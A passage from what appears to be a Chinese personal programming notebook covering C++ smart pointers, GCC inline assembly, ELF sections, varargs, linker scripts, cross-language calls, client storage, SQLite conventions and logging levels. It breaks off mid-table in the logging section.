		return *this;
	}

	//  析构函数
	~SmartPtr()
	{
		if (ptr_cnt != nullptr)
		{
			ptr_cnt-&gt;cnt--;
			if (ptr_cnt-&gt;cnt == 0)
				delete ptr_cnt;
		}
	}

	T&amp; operator*()     const { return *(ptr); }
	T* operator&amp;()     const { return ptr; }
	size_t use_count() const { return ptr_cnt-&gt;cnt; }
	bool unique()      const { return (ptr_cnt-&gt;cnt == 1); }
	T* get()           const { return ptr; }
};
/*
————————————————
版权声明：本文为CSDN博主「RaKiRaKiRa」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/RaKiRaKiRa/article/details/94991797
*/
</code></pre>
<p>UCObject UCPointer</p>
<p>有时候我们需要把智能指针作为参数传递，有下面三种方式：</p>
<pre><code class="language-cpp">void passByValue(std::unique_ptr&lt;Resource&gt; mResPtr) {}
void passByConstRef(const std::unique_ptr&lt;Resource&gt;&amp; mResRef) {}
void passByRawPtr(Resource *mResPtr) {}
</code></pre>
<p>一般来说第三个是比较好的传递参数的方式，在函数不需要拥有对象所有权的情况下。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="c-内嵌汇编"><a class="header" href="#c-内嵌汇编">C-内嵌汇编</a></h1>
<p>因为C语言翻译成汇编语言并不复杂，内嵌汇编也并不复杂。但是汇编和硬件强相关，所以还是要结合具体架构。</p>
<p><a href="http://ericw.ca/notes/a-tiny-guide-to-gcc-inline-assembly.html">参考链接</a></p>
<h2 id="方法"><a class="header" href="#方法">方法</a></h2>
<p>使用方法：<code>__asm__ __volatile__ (汇编语句 : 输出 : 输入 : 破坏寄存器)</code>，其中violate是告诉GCC不要做优化。</p>
<ul>
<li>
<p>汇编语句：</p>
<ul>
<li>在一个字符串内完成，用<code>;</code>分隔语句。为了美观可以用<code>\</code>换行。</li>
<li>具体的语句和架构有关。如果用到了后面的输入输出部分的寄存器可以用<code>%index</code>指定，见demo。</li>
</ul>
</li>
<li>
<p>输出：<code>&quot;=类型&quot;(C语言元素)</code></p>
</li>
<li>
<p>输入：<code>&quot;类型&quot;(C语言元素)</code></p>
<ul>
<li>类型主要有&quot;r&quot;寄存器，&quot;m&quot;内存，&quot;i&quot;立即数</li>
</ul>
</li>
<li>
<p>破坏描述：<code>&quot;破坏的寄存器&quot;</code></p>
<ul>
<li>告诉GCC哪些寄存器的内容被改变了</li>
</ul>
</li>
</ul>
<h2 id="demo"><a class="header" href="#demo">Demo</a></h2>
<p>我们来看几个demo：</p>
<p>RISCV</p>
<pre><code>__asm__(
        &quot;csrw sepc,%0;\
         sret;&quot;
        :
        :&quot;r&quot;(dead_loop));
)
</code></pre>
<p>x86，注意是AT&amp;T格式的汇编。</p>
<pre><code>    int flag, new_flag;
    __asm__
    (
    &quot;movl %1, %%eax \n&quot;
    &quot;orw $2, %%ax \n&quot;
    &quot;movl %%ax, %0 \n&quot;
    : &quot;=r&quot;(new_flag) /* output */
    : &quot;r&quot;(flag)      /* input */
    : &quot;%eax&quot;         /* clobbered register */
    );
    
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="变量在elf段中的位置"><a class="header" href="#变量在elf段中的位置">变量在ELF段中的位置</a></h1>
<p>我们知道数据主要存放在三个段：<code>.bss</code>, <code>.rodata</code>, <code>.data</code></p>
<ul>
<li>.bss：未被初始化的全局和静态C变量，以及被初始化成0的全局或静态变量。（所以我们要被bss段清零）</li>
<li>.rodata：只读数据。如下面的&quot;hello world&quot;和const。</li>
<li>.data：已初始化的全局和静态C变量。</li>
<li>对于局部的C变量，一般保存在栈里，或者有可能被优化了，只保存在寄存器中。</li>
<li>对于malloc分配出来的内存，在堆上。</li>
</ul>
<p>我们直接采用一个C程序结合readelf工具进行分析。</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
static int i_static;            //.bss
int i_global;                   //.bss
static int i_static_ini=10;     //.data
int i_global_ini=10;            //.data
const int i_const_global=101;   //.rodata
const static int i_const_static=102;   //.rodata

int main()
{
    int i;      //stack
    static int i_static_function;     //.bss
    static int in_static_function_ini = 100;    //.data
    const int i_con=103;    //stack
    const static int i_con_static=104;  //.rodata
    printf(&quot;Hello world\n&quot;);    //.rodata
    return 0;
}
</code></pre>
<pre><code class="language-c">  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [16] .rodata           PROGBITS         0000000000000750  00000750
       0000000000000010  0000000000000000   A       0     0     4
  [25] .data             PROGBITS         0000000000201020  00001020
       000000000000001c  0000000000000000  WA       0     0     8
  [26] .bss              NOBITS           000000000020103c  0000103c
       0000000000000014  0000000000000000  WA       0     0     4
</code></pre>
<p>我们可以由此算出三个段的起止位置，然后结合符号表中描述的地址。</p>
<p>当然了，这都是在ELF文件中的位置。由于起始地址的随机化，程序运行时这些变量在内存中的位置还要另说，但是段总是不变的。</p>
<h3 id="函数中的const变量"><a class="header" href="#函数中的const变量">函数中的const变量</a></h3>
<p>我们可以观察到一个有趣的现象，就是<code>const int i_con=103;    //stack</code>也是在stack中的，而不是在rodata段。我们并不能在符号表中找到他。</p>
<p>然后我们思考，stack不可能具有写的保护。我们利用指针可以轻易地更改这个const变量。如果我们使用指针指向这个变量，GCC也会警告我们const不再管用。</p>
<p>与之对比，如果我们把指针指向那些在rodata段的变量然后修改它，会得到segment fault。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="可变参数的使用和原理"><a class="header" href="#可变参数的使用和原理">可变参数的使用和原理</a></h1>
<p>其实知道C语言参数传递的原理的话，就知道可变参数的原理其实并不困难。我们传入的参数从右到左压栈，也就是说最左边的参数会在栈的顶部（除了返回地址）。
我们根据第一个参数确定可变参数的个数。</p>
<h2 id="使用"><a class="header" href="#使用">使用</a></h2>
<p>我们需要<code>#include &lt;stdarg&gt;</code>，然后里面有关键的三个宏函数：</p>
<p>Following are the macros defined in the header stdarg.h：</p>
<div class="table-wrapper"><table><thead><tr><th>Sr.No.</th><th>Macro &amp; Description</th></tr></thead><tbody>
<tr><td>1</td><td><a href="https://www.tutorialspoint.com/c_standard_library/c_macro_va_start.htm">void va_start(va_list ap, last_arg)</a>This macro initializes <strong>ap</strong> variable to be used with the <strong>va_arg</strong> and <strong>va_end</strong> macros. The <strong>last_arg</strong> is the last known fixed argument being passed to the function i.e. the argument before the ellipsis.</td></tr>
<tr><td>2</td><td><a href="https://www.tutorialspoint.com/c_standard_library/c_macro_va_arg.htm">type va_arg(va_list ap, type)</a>This macro retrieves the next argument in the parameter list of the function with type <strong>type</strong>.</td></tr>
<tr><td>3</td><td><a href="https://www.tutorialspoint.com/c_standard_library/c_macro_va_end.htm">void va_end(va_list ap)</a>This macro allows a function with variable arguments which used the <strong>va_start</strong> macro to return. If <strong>va_end</strong> is not called before returning from the function, the result is undefined.</td></tr>
</tbody></table>
</div>
<p>了解了三个宏之后，我们来看一个demo</p>
<pre><code class="language-c">//这是简化版的printf
#include &lt;stdio.h&gt;
#include &lt;stdarg.h&gt;
void print(char *fmt, ...)
{
    va_list ap;		
    int d;
    char c, *s;
    va_start(ap, fmt);	//首先我们确定第一个可变参数的位置
    while (*fmt)
	{
		if (*fmt=='%')
		{
		switch(*++fmt)
			{
				case 's': /* 字符串 */
					s = va_arg(ap, char *);		//取出下一个参数
					puts(s);
					break;
				case 'd': /* 整数 */
					d = va_arg(ap, int);
					printf(&quot;%d&quot;, d);
					break;
				case 'c': /* 字符 */
					c = (char)va_arg(ap, int);	//好像是因为对齐
					putchar(c);
				break;
			}
		}
		else
			putchar(*fmt);
		fmt++;
	}
    va_end(ap);	//在返回之前调用
}
</code></pre>
<p>有时候你可能有特殊的需求不想include stdarg，我们可以这样代替。注意，是gcc。</p>
<pre><code class="language-c">typedef __builtin_va_list va_list;
#define va_start(v,l)	__builtin_va_start(v,l)
#define va_end(v)	__builtin_va_end(v)
#define va_arg(v,l)	__builtin_va_arg(v,l)
</code></pre>
<h2 id="原理-1"><a class="header" href="#原理-1">原理</a></h2>
<p>最基本的原理就是传参的方式。但是，对于64位的Linux来说，参数传递的方式很复杂。是寄存器和栈的结合，对于老的32位机器来说，参数都在栈上传递，我们只需要分析偏移就好。我也没找到宏的定义。这个坑估计填不上了。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="在c程序中调用汇编程序"><a class="header" href="#在c程序中调用汇编程序">在C程序中调用汇编程序</a></h1>
<p>我们在之前一篇文章提到了内嵌汇编的语法(<a href="https://reticenceji.github.io/post/gcc-nei-qian-hui-bian/">GCC内嵌汇编</a>)。但是如果我们想调用一个汇编文件中的函数，应该怎么做呢？</p>
<p>其实非常简单。我们直接看一个demo</p>
<pre><code>#第一个参数 a0 current
#第二个参数 a1 prev
.globl __switch_to
.type __switch_to,@function
__switch_to:
	sd ra,0(a1)
	sd sp,8(a1)
	sd s0,16(a1)
	sd s1,24(a1)
	sd s2,32(a1)
	sd s3,40(a1)
	sd s4,48(a1)
	sd s5,56(a1)
    ......
    ret
</code></pre>
<p>ASM文件中重点就两个：</p>
<ol>
<li>明确参数和返回值的传递方式，这个和具体架构有关。GCC似乎也有几个宏可以规定使用的&quot;calling convention&quot;，但是在RISCV中没找到。上面的例子是riscv的传参规范。</li>
<li>伪指令。首先globl是显然的，全局符号才能在别的文件中被使用。<code>.type symbol, @function</code>：accepted for source compatibility。</li>
<li>以上内容应该在<code>.S</code>文件中。</li>
</ol>
<p>我们再来看C语言中怎么调用。</p>
<ol>
<li>首先我们需要一个函数原型：<code>extern TypeRet __switch_to(Type1 ,Type2);</code></li>
<li>我们直接调用即可<code>__switch_to(Arg1,Arg2)</code></li>
</ol>
<p>这是GCC规定参数传递规范的宏，针对x86。使用方法<code>__atrribute__((cdecl))</code>：</p>
<ul>
<li>cdecl
On the x86-32 targets, the cdecl attribute causes the compiler to assume that the calling function pops off the stack space used to pass arguments. This is useful to override the effects of the -mrtd switch.</li>
<li>fastcall
On x86-32 targets, the fastcall attribute causes the compiler to pass the first argument (if of integral type) in the register ECX and the second argument (if of integral type) in the register EDX. Subsequent and other typed arguments are passed on the stack. The called function pops the arguments off the stack. If the number of arguments is variable all arguments are pushed on the stack.</li>
<li>thiscall
On x86-32 targets, the thiscall attribute causes the compiler to pass the first argument (if of integral type) in the register ECX. Subsequent and other typed arguments are passed on the stack. The called function pops the arguments off the stack. If the number of arguments is variable all arguments are pushed on the stack. The thiscall attribute is intended for C++ non-static member functions. As a GCC extension, this calling convention can be used for C functions and for static member methods.
riscv可以参考这个链接：https://gcc.gnu.org/onlinedocs/gcc/RISC-V-Options.html</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="链接器"><a class="header" href="#链接器">链接器</a></h1>
<h2 id="lds是什么"><a class="header" href="#lds是什么">lds是什么</a></h2>
<p>linker script，简单的可以认为是告诉链接器ld怎么去链接的。</p>
<blockquote>
<p>The main purpose of the linker script is to describe how the sections in the input files should be mapped into the output file, and to control the memory layout of the output file. 
说明各个section怎么映射到输出的文件，并且规定输出文件的内存布局。
<a href="https://sourceware.org/binutils/docs/ld/Basic-Script-Concepts.html">基础知识</a></p>
</blockquote>
<h2 id="基础lds文件分析"><a class="header" href="#基础lds文件分析">基础lds文件分析</a></h2>
<p>以这一段代码为例，要用的话是不能带#后面的东西的。</p>
<pre><code>OUTPUT_ARCH( &quot;riscv&quot; )      #架构
ENTRY( _start )         #设置入口点
BASE_ADDR = 0x80000000;
SECTIONS
{
  . = BASE_ADDR;      
  #对一个特殊的符号'.'赋值, 这是一个定位计数器.
  .text : { *(.text) }        
  #定义一个输出节.text ，节名后面的花括号中，列所有应当被放入到这个输出节中的输入节的名字.
  #'*'是一个通配符,匹配任何文件名
  #此时定位计数器 . 的值是'0x10000',连接器会把输出文件中的'.text'节的地址设为'0x10000'.
  .rodata : { *(.rodata) }  
  #此时定位计数器的值为 .+text节的长度。
  #连接器会通过在必要时增加定位计数器的值来保证每一个输出节具有它所需的对齐.
  .data : { *(.data) }
  .bss : { *(.bss) }
  . += 0x8000;
  stack_top = .;
  _end = .;
}
</code></pre>
<h2 id="memory"><a class="header" href="#memory">MEMORY</a></h2>
<p><a href="https://sourceware.org/binutils/docs/ld/MEMORY.html">参考文档</a>
The MEMORY command describes the location and size of blocks of memory in the target. 给内存分块（origin~origin+length），attr说明属性（读、写、执行、初始化、可分配）</p>
<pre><code>MEMORY
  {
    name [(attr)] : ORIGIN = origin, LENGTH = len
    …
  }
</code></pre>
<p>显然我们把内存分块之后，是为了要把上面提到的各个section装载进去的。
一个没有被映射的section，如果和上面提到的attr完全匹配。
也可以用<code>&gt;name</code>指定section要映射的内存区域。默认是VMA。
要指定LMA的映射内存区域，The load address is specified by the AT or AT&gt; keywords。The AT keyword takes an expression as an argument. This specifies the exact load address of the section. The AT&gt; keyword takes the name of a memory region as an argument. 
否则的话，LMA就等于VMA了。</p>
<blockquote>
<p>The output section address heuristic is as follows:
If an output memory region is set for the section then it is added to this region and its address will be the next free address in that region.
If the MEMORY command has been used to create a list of memory regions then the first region which has attributes compatible with the section is selected to contain it. The section’s output address will be the next free address in that region; MEMORY.
If no memory regions were specified, or none match the section then the output address will be based on the current value of the location counter.</p>
</blockquote>
<p>https://sourceware.org/binutils/docs/ld/Output-Section-LMA.html#Output-Section-LMA</p>
<h2 id="phdrs"><a class="header" href="#phdrs">PHDRS</a></h2>
<p><a href="https://sourceware.org/binutils/docs/ld/PHDRS.html">参考文档</a>
简单的说，这个段用来<strong>显式</strong>的指明要生成的Program Headers。Program headers 说明程序要如何装载入内存。可以用<code>objdump -p </code>打印Program Headers.</p>
<pre><code>    PHDRS
    {
    name type [ FILEHDR ] [ PHDRS ] [ AT ( address ) ]
            [ FLAGS ( flags ) ] ;
    }
</code></pre>
<p>同样的这个也是要和上面提到的section对应的。我们加入<code>:name</code>指定section对应的Header Entry。</p>
<h2 id="provide和hidden"><a class="header" href="#provide和hidden">PROVIDE和HIDDEN</a></h2>
<p>PROVIDE引出一个符号，外部可以使用。
HIDDEN隐藏符号，对外部不可见。
要使用符号，正确的做法是取符号的地址。</p>
<pre><code class="language-c">  extern char start_of_ROM, end_of_ROM, start_of_FLASH;
  memcpy (&amp; start_of_FLASH, &amp; start_of_ROM, &amp; end_of_ROM - &amp; start_of_ROM);
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="client-development"><a class="header" href="#client-development">Client Development</a></h1>
<p><img src="Basic/Client/../images/1608621418682_afa77d60ed8e46b193632b1282f3621e.png" alt="img" /></p>
<p>在飞书的实习内容是客户端中间件的开发，积累。做的大概是第二行的那一块中的一个。。</p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><p><img src="Basic/Client/../images/origin_img_v2_ccfef370-fc1d-4124-9109-87d15a5fb86g.jpg" alt="code review pyramid" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="config"><a class="header" href="#config">Config</a></h1>
<p>简单的配置，保存在本地的配置文件就可以了。</p>
<p>也可以从服务器拉配置。</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: left">配置ID</th><th style="text-align: left">配置名称</th><th style="text-align: left">负责人</th><th style="text-align: left">配置简介</th><th style="text-align: left">状态</th><th style="text-align: left">最近修改</th><th style="text-align: left">操作</th><th></th></tr></thead><tbody>
<tr><td style="text-align: left"></td><td style="text-align: left">x x x</td><td style="text-align: left">x x x</td><td style="text-align: left">xxx</td><td style="text-align: left">生效</td><td style="text-align: left"></td><td style="text-align: left"></td><td></td></tr>
</tbody></table>
</div><div style="break-before: page; page-break-before: always;"></div><h1 id="跨语言"><a class="header" href="#跨语言">跨语言</a></h1>
<p>跨语言调用就是要解决A语言写的函数想在B语言里调用的问题。</p>
<p>解决方案一种是将函数做成一个服务，通过<strong>IPC(Inter-Process Communication，进程间通信)</strong>；另一种是直接通过**FFI(Foreign Function Interface)**调用。一般来说，前者更高效，后者的扩展性更好，开发成本更低。</p>
<p>跨语言主要的问题：</p>
<ol>
<li>如何在一个语言去调用另一个语言的函数？如何传递参数，如何返回值？</li>
<li>如果传递的是指针怎么办（或者说有大块内存要传递）。</li>
<li>如果调用是异步的要怎么办？</li>
</ol>
<h2 id="ffi"><a class="header" href="#ffi">FFI</a></h2>
<p>像C/C++/Rust这种，可以编译出动态库/静态库，导出C ABI的语言，都比较容易被其他语言直接通过FFI调用。C ABI(platform specific) 可以说是FFI的事实标准了。几乎所有语言都会提供调用C语言库的方式。</p>
<p>不严谨的说</p>
<ul>
<li>如果你的程序可以导出C接口，就可以通过FFI被其他语言调用</li>
<li>如果你的程序可以接入C接口，就可以调用其他语言写的库</li>
</ul>
<div class="table-wrapper"><table><thead><tr><th>语言</th><th>调用C接口的方式</th></tr></thead><tbody>
<tr><td>Java</td><td>JNI</td></tr>
<tr><td>Python</td><td>C</td></tr>
</tbody></table>
</div>
<p>但是FFI也是存在问题的</p>
<ol>
<li>怎么把数据变成C类型？如Python中的数字是不定长的。一般来说需要一些约定，或者可以通过下面介绍的一些通用编码方式绕过。</li>
<li>C接口注定不支持面向对象。如果需要提供面向对象的接口，还需要对C接口做进一步的封装。</li>
<li>如果小规模数据，只通过栈和寄存器传递就好。但是有时有大规模数据，通过堆来传输，这个时候就要关注两个语言内存模型的不同。不泄漏，自己回收自己。</li>
</ol>
<h2 id="ipc"><a class="header" href="#ipc">IPC</a></h2>
<p>我们考虑两个事情</p>
<ol>
<li>怎么把参数传递过去</li>
<li>怎么对参数进行编码</li>
</ol>
<p>IPC的方式：</p>
<ol>
<li><strong>Pipes (Same Process)</strong> This allows flow of data in one direction only. Analogous to simplex systems (Keyboard). Data from the output is usually buffered until input process receives it which must have a common origin.</li>
<li><strong>Names Pipes (Different Processes)</strong> This is a pipe with a specific name it can be used in processes that don’t have a shared common process origin. E.g. is FIFO where the details written to a pipe is first named.</li>
<li><strong>Message Queuing</strong> :star: :This allows messages to be passed between processes using either a single queue or several message queue. This is managed by system kernel these messages are coordinated using an API. </li>
<li><strong>Semaphores</strong> This is used in solving problems associated with synchronization and to avoid race condition. These are integer values which are greater than or equal to 0.</li>
<li><strong>Shared memory</strong> This allows the interchange of data through a defined area of memory. Semaphore values have to be obtained before data can get access to shared memory.</li>
<li><strong>Sockets</strong> This method is mostly used to communicate over a network between a client and a server. It allows for a standard connection which is computer and OS independent. （Socket不在乎两端是否在一台机器上）</li>
</ol>
<p>这个思路可以拓展到并非本地的跨语言调用，比如一个服务部署在远程的服务器上，本地去调用远程的方法。利用网络协议来传递数据。</p>
<blockquote>
<p>消息队列常用中间件：Kafka、ActiveMQ、RabbitMQ、RocketMQ</p>
</blockquote>
<h2 id="数据编码"><a class="header" href="#数据编码">数据编码</a></h2>
<p>RPC/IPC是逃不开对数据进行编码的，而用FFI的方式其实也可以用下面的方式进行编码，把所有对外暴露的功能都抽象成下面的形式，用<code>command</code>指定要调用的函数，<code>buffer</code>和<code>length</code>传递编码的数据</p>
<pre><code class="language-c">void handler(int command, char* buffer, size_t length);
</code></pre>
<h3 id="json--xml"><a class="header" href="#json--xml">JSON &amp; XML</a></h3>
<p>非常简单KV编码方式。很多语言都有相关的序列化库。</p>
<h3 id="protocol-buffer"><a class="header" href="#protocol-buffer">Protocol Buffer</a></h3>
<p>Protocol buffer(下面简称pb)是谷歌开发的<strong>语言中立，平台无关，可扩展的序列化数据的格式</strong>（看到这里也许你想起了JSON/XML），可用于通信协议，数据存储等。<strong>Protocol buffers 很适合做数据存储或 RPC 数据交换格式</strong>。</p>
<p>他有着以下优势：</p>
<ul>
<li>**数据量更小：**相比于JSON/XML，他更高效，压缩后的数据，比 JSON 小 50% 左右。</li>
<li>**安全性更好：**需要拿到.proto文件才能解析数据</li>
<li>**操作更简单：**只需要定义IDL就可以生成多种语言的序列化和反序列化代码</li>
<li>**兼容性很强：**如果我们需要修改数据的格式，在满足一定条件下我们可以不更改之前的代码(也能跑，但是逻辑的正确性不保证)</li>
</ul>
<h3 id="定义"><a class="header" href="#定义">定义</a></h3>
<p>在 pb 中，所有结构化的数据都被称为 <strong>消息(message)</strong>。例如下面的例子定义了消息 helloworld，定义了两个<strong>字段</strong>，必要的int32类型的id编号为1，和可选的string类型的opt编号为7。</p>
<pre><code class="language-protobuf">message helloworld 
{ 
   required int32 id = 1;   
   optional string opt = 7;
}
</code></pre>
<p>每个消息定义中的每个字段都有<strong>唯一的编号</strong>。这些字段编号用于标识消息二进制格式中的字段。</p>
<p>可以指定的最小字段编号为1，最大字段编号为2^29^-1（原因之后就会知道）。19000 到 19999（FieldDescriptor :: kFirstReservedNumber 到 FieldDescriptor :: kLastReservedNumber）也不能用，因为它们是为 Protocol Buffers实现保留的。</p>
<p>每个字段也有类型。</p>
<h3 id="编码格式"><a class="header" href="#编码格式">编码格式</a></h3>
<p>pb将数据压缩成二进制格式。</p>
<p>Variant编码方式，它用一个或多个字节来表示一个数字，值越小的数字使用越少的字节数。而日常使用的数字大都较小（视情况而定），所以能够节省空间，如果都是大数字反而会浪费空间。</p>
<h2 id="thrift"><a class="header" href="#thrift">Thrift</a></h2>
<p>protobuf可以作为FFI/RPC的数据交换格式，thrift也是FFI/RPC的利器。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="本地存储"><a class="header" href="#本地存储">本地存储</a></h1>
<p>在客户端进行本地存储，主要的应用场景有：</p>
<ol>
<li>作为网络IO的缓存，提升用户体验。（比如缓存图片）</li>
<li>作为内存的备份。</li>
<li>持久化保存一些配置或者数据。</li>
</ol>
<p>衡量存储的指标</p>
<ol>
<li>读写性能（IO复杂度）</li>
<li>并发性能</li>
<li>数据完整性能</li>
<li>空间性能</li>
</ol>
<p>关于IO性能，可以参考另一篇文章，加速IO。</p>
<p>相比于服务端：</p>
<ol>
<li>服务端存储的数据是非常重要的，数据不会随便丢失，所以一般会做数据备份，而客户端受限于磁盘空间，一般是不会做备份的，不过也有一些特殊情况。比如IM的场景中，因为消息数据完全存储于用户设备上，一种方式是通过恢复的方式来，另外还有一种兜底的方式就是定时备份一份数据。</li>
<li>服务端对于安全性要求会比较高，所以一般对于用户的权限会比较看重，客户端一般不会使用到用户管理这块。</li>
<li>服务端为了性能考虑需要进行读写分离，分库分表等，一般客户端的瓶颈不会是数据库，所以一般对于数据库的性能要求没有这么高，一般情况下，写操作汇聚在一个队列中进行写入往往也是没问题的。</li>
</ol>
<h2 id="plist"><a class="header" href="#plist">PList</a></h2>
<ol>
<li>读写性能（平均/最坏）：$O(n)$ （需要将文件的所有内容都读到内存中进行操作，每次修改都会写回）</li>
<li>并发性能：需要自己实现</li>
<li>数据完整性能：断电的话会导致数据全部丢失</li>
<li>空间性能：磁盘$O(n)$</li>
</ol>
<h2 id="nsuserdefaults"><a class="header" href="#nsuserdefaults">NSUserDefaults</a></h2>
<p>一个客户端KV存储方案，是对PList的优化，建议在存储少量数据（小于4M）的时候使用。</p>
<ol>
<li>读性能：平均$0$，最坏$O(n)$ （会将读取对数据在内存中缓存）</li>
<li>写性能：平均$O(n/x)$，最坏$O(n)$（一般在若干次写入后会写回）</li>
<li>数据完整性：有可能会丢失数据</li>
<li>空间性能：磁盘$O(n)$，内存$O(n)$</li>
<li>并发性能：线程安全，不支持并发</li>
</ol>
<h2 id="mmkv"><a class="header" href="#mmkv">MMKV</a></h2>
<p>是一个轻量的Key-value存储方式，可以类比服务端常用的Redis。</p>
<p>利用了<code>mmap</code>实现高效的读写和较高完整性的保障。</p>
<ol>
<li>读性能：平均$0$，最坏$k*O(n)$ （<code>mmap</code>）</li>
<li>写性能：平均$0$，最坏$O(n)$（文件满了之后会写回）</li>
<li>数据完整性：断电会丢失数据</li>
<li>空间性能：磁盘$O(n)$，内存$O(n)$</li>
<li>并发性能：线程安全，不支持并发</li>
</ol>
<h2 id="sqlite-star"><a class="header" href="#sqlite-star">SQLite :star:</a></h2>
<p>SQLite利用BTree提供了高效、安全的存储。有关SQLite更详细的介绍有专门的<a href="Basic/Client/SQLite.html">一篇文章</a>。</p>
<p>DELETE模式的SQLite</p>
<ol>
<li>读性能（平均/最坏）：$O(log n)$ </li>
<li>写性能（平均/最坏）：$2 * O(log n) + O(1)$（要读老数据、写日志、写新数据）</li>
<li>数据完整性：<code>fsync</code>保证文件写入，日志保证数据可以被恢复</li>
<li>空间性能：文件大小不会减小（Lazy Delete），BTree/索引需要额外的空间进行存储。</li>
<li>并发性能：提供了多种模式，但是并不保证并发成功（SQLite-Busy）</li>
</ol>
<p>WAL模式，大幅提升写入性能和并发性能 。有一个WAL文件，可以顺序的写入，定期(在Checkpoint)将它写回真正的DB文件，如何控制Checkpoint是一个重要的问题。</p>
<ol>
<li>
<p>读性能：平均$O(log n)$（WAL文件一般很小忽略） ，最坏$O(n)$ （如果WAL文件很大）</p>
</li>
<li>
<p>写性能（平均/最坏）：平均$O(1)$（顺序写入WAL文件），最坏$m * O(log n) + O(m)$（把m个数据写回数据库文件）</p>
</li>
<li>
<p>数据完整性：减小了对BTree的操作，不容易损坏。</p>
</li>
<li>
<p>空间性能：同DELETE</p>
<p>并发性能：提供了多种模式，但是并不保证并发成功（SQLite-Busy）</p>
</li>
</ol>
<h2 id="yycache"><a class="header" href="#yycache">YYCache</a></h2>
<p>缓存图片的很好的方案</p>
<p>提供的存储接口是KV形式的，提供了LRU机制，基于SQLite。</p>
<p>YYCache做了小文件优化，20K以下存数据库，大文件单独存文件。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="database"><a class="header" href="#database">Database</a></h1>
<p>客户端也需要Database，用于数据持久化。在客户端SQLite是被广泛使用的，他比MySQL/PosgreSQL更加轻量化。</p>
<h2 id="数据库使用规范"><a class="header" href="#数据库使用规范">数据库使用规范</a></h2>
<h3 id="命名建议"><a class="header" href="#命名建议">命名建议</a></h3>
<p>索引应该使用<code>id_</code>作为前缀，唯一索引应该使用<code>uniq_id_</code>作为前缀。</p>
<h3 id="字段建议"><a class="header" href="#字段建议">字段建议</a></h3>
<ol>
<li>
<p>尽量使用NOT NULL</p>
<blockquote>
<ul>
<li>
<p>可以为NULL的字段会使用更多的存储空间</p>
</li>
<li>
<p>可为NULL的列被索引时每个索引要一个额外的字节。</p>
</li>
<li>
<p>对NULL进行处理不能用<code>= in &lt; &gt; != not in</code>等符号，容易出错</p>
</li>
<li>
<p>如果查询中包含NULL的列对数据库来说更难优化，NULL让索引、索引统计和值都更复杂。</p>
</li>
</ul>
</blockquote>
</li>
<li>
<p>严禁明文存储用户的密码、身份证等敏感信息</p>
</li>
<li>
<p>避免用blob/text来存储大段文本、二进制数据。建议将数据保存为本地磁盘文件，数据库中只保存其索引信息。</p>
</li>
<li>
<p>避免使用外键，影响数据库写操作的效率，数据完整性建议在业务层实现。</p>
</li>
<li>
<p>禁止使用小数保存货币</p>
</li>
<li>
<p>将运算逻辑在业务层实现</p>
</li>
</ol>
<h3 id="索引建议"><a class="header" href="#索引建议">索引建议</a></h3>
<ol>
<li>避免在更新频繁，区分度不高的字段建立索引。</li>
<li>单表的索引数不超过5个，单个索引的字段数不超过5个。太多起不到过滤作用，反而占空间。</li>
<li>谨慎使用负向查询，%开头的模糊查询，这样无法利用索引，导致全表扫描。</li>
</ol>
<h3 id="sql建议"><a class="header" href="#sql建议">SQL建议</a></h3>
<ol>
<li>不用SELECT *，而是只取所需字段。</li>
<li>避免大事务，大事务拆成小事务，防止长时间锁住表。</li>
<li>SQL语句建议全部大写。</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="flutter"><a class="header" href="#flutter">Flutter</a></h1>
<p>$UI= f(state)$</p>
<ul>
<li>UI: the layout of the screen</li>
<li>f: our build methods</li>
<li>state: the application state</li>
</ul>
<p><a href="https://flutter.dev/">Flutter</a>是Google推出的<strong>跨平台</strong>UI框架。可以用于移动端（iOS/Android），也可以用于桌面（MacOS/Windows/Linux），也可以用于Web。</p>
<p>一个优秀的GUI框架应该可以做到：</p>
<ol>
<li>快速编译或者解释，总是可以快速的看到我修改之后的结果。</li>
<li>性能不要太差。</li>
</ol>
<p>https://book.flutterchina.club/</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="日志"><a class="header" href="#日志">日志</a></h1>
<p>日志应有哪些属性：</p>
<ol>
<li>Id：唯一标识代码中的一条日志</li>
<li><strong>Level：日志等级，比如INFO，DEBUG，WARN，ERROR，FATAL。</strong></li>
<li>Context Id：唯一标识一次行为</li>
<li><strong>Message：字符串常量、带参字符串、纯变量</strong></li>
<li>params：SDK中的extra字段，kv类型json string</li>
<li>time</li>
<li>module</li>
<li>tags</li>
<li>category：日志属于哪一个模块的问题</li>
<li>file&amp;line：打日志的文件和行，用于定位代码</li>
<li>timestamp：产生日志的时间</li>
<li>thread_id: 如果是多线程的应用，应该让日志带有thread_id标志他在那个线程执行（基于协程的并发也是类似的，可以叫做task_id）</li>
</ol>
<p>要手动填写的基本只有Level，Message，Catagory</p>
<p>级别建议：</p>
<div class="table-wrapper"><table><thead><tr><th>级别描述</th><th><strong>级别</strong></th><th><strong>实时上传</strong></th><th><strong>统一化定义</strong></th><th>使用方式</th><th>控制比例</th></tr></thead><tbody>
<tr><td><strong>TRACE</strong></td><td>1</td><td>否</td><td>用法和debug类似，但是该级别被期望输出尽量全的信息，一些数据量很大的信息。或者发生频率比较高的分支。一般只有在一些特殊情况，联机调试信息的时候才会使用。</td><td></td><td></td></tr>
<tr><td><strong>DEBUG</strong></td><td>2</td><td>否</td><td>任何对开发调试有用的日志</td><td>顺序执行的一段上下文中使用，用于提供更详细的信息</td><td>48%</td></tr>
<tr><td><strong>INFO</strong></td><td>3</td><td>是</td><td>定义关键路径</td><td>分支入口必须添加 异步入口必须添加 线程入口必须添加 。。。</td><td>20%</td></tr>
